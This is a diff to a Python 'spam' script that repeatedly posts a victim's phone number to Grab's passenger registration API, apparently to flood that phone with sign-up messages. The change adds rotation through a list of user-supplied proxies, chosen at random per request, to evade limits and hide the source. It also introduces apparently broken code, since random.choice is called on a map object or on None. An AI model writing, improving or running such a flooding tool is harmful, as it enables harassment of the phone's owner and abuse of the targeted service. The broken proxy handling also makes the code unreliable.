@@ -5,26 +5,27 @@
 
 
 import requests
+import random
 from time import sleep
 
 # by Pyroarsonist
 
 PHONE_INPUT_STRING = 'Enter phone: '
 DELAY_INPUT_STRING = 'Delay: '
-PROXY_INPUT_STRING = """Proxy or enter for none
-Format: http://69.69.69.69:8080
+PROXY_INPUT_STRING = """Proxies (You can get free proxies from there: free-proxy-list.net) or enter for none
+Format: http://69.69.69.69:8080,http://69.69.69.69:8080,http://69.69.69.69:8080
 """
 
 
 phone = input(PHONE_INPUT_STRING)
 delay = int(input(DELAY_INPUT_STRING))
-proxy = input(PROXY_INPUT_STRING)
+proxies = input(PROXY_INPUT_STRING)
 
 
-if not proxy:
-    proxy = None
+if not proxies:
+    proxies = None
 else:
-    proxy = {'http': proxy, 'https': proxy}
+    proxies = map(lambda x: {'http': x, 'https': x}, proxies.split(','))
 
 
 url = 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
@@ -34,7 +35,7 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
 
 def spam():
     try:
-        r = requests.post(url, data=data, headers=headers, proxies=proxy)
+        r = requests.post(url, data=data, headers=headers, proxies=random.choice(proxies))
     except requests.exceptions.ConnectionError:
         print('ConnectionError thrown!')
     else:
